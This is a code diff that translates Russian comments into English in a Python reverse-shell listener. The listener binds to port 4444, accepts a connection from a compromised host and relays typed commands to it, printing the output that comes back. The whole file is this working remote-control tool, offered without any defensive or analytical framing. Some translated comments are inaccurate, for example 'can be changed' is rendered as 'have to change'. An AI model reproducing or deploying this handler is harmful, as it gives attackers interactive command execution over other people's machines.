@@ -1,27 +1,27 @@
-#Добавление необходимых библеотек
+#adding of libraries
 import os
 import sys
 import socket
 
-#Создание серверного сокета для подключения
+#creating of server socket
 def socket_create():
 
-    #Попытка создания глобальных переменных и самого сокета
+    #try of defining global variables
     try:
         global host
         global port
         global s
 
         host = ""
-        #Можно поменять
+        #have to change
         port = 4444
         s = socket.socket()
 
-    #При появлении ошибки выводится информация о ней
+    #When an error occurs, information about it is displayed
     except socket.error as msg:
         print(f"\033[30m[-]\033[0m Error: {str(msg)}")
 
-#Назначение сокета и прослушивание порта
+#The appointment of a socket and listen on port
 def socket_bind():
     try:
         global host
@@ -33,47 +33,47 @@ def socket_bind():
         s.bind((host, port))
         s.listen(5)
 
-    #Повтор функции при неудаче
+    #Repeat function on failure
     except socket.error as msg:
         print(f"\033[30m[-]\033[0m Error: {str(msg)}Trying again")
         socket_bind()
 
-#Подтверждение подключения
+#accept of connection
 def socket_accept():
 
     conn, address = s.accept()
     print(f"\033[32m[+]\033[0m Successful: Socket accepted {host}:{str(port)}")
 
-    #Запуск функции для отправки команд удалённому хосту
+    #start function for sending and receive commands
     send_commands(conn)
     conn.close()
 
 
-#Функция для отправки команд удалённому хосту
+#function for sending and receive data
 def send_commands(conn):
-    #Создание цикла для ввода
+    #creating cycle for input
     while True:
         cmd = input()
 
-        #Проверка на команду quit для выхода из программы
+        #Checking for the quit command to exit the program
         if cmd == "quit":
             conn.close()
             s.close()
             sys.exit()
 
-        #Отправка команд удалённому хосту
+        #Sending commands to a remote host
         elif len(str.encode(cmd)) > 0:
-            #Отправка команды
+            #sending command
             conn.send(str.encode(cmd))
-            #Получение вывода от удалённого хоста
+            #getting output
             client_response = str(conn.recv(4096), "utf-8")
             print(client_response, end="")
 
-#Главная функция запускающая последовательно предыдущие функции
+#Main function that starts the previous functions sequentially
 def main():
     socket_create()
     socket_bind()
     socket_accept()
 
-#Запуск главной функции
+#start of main function
 main()
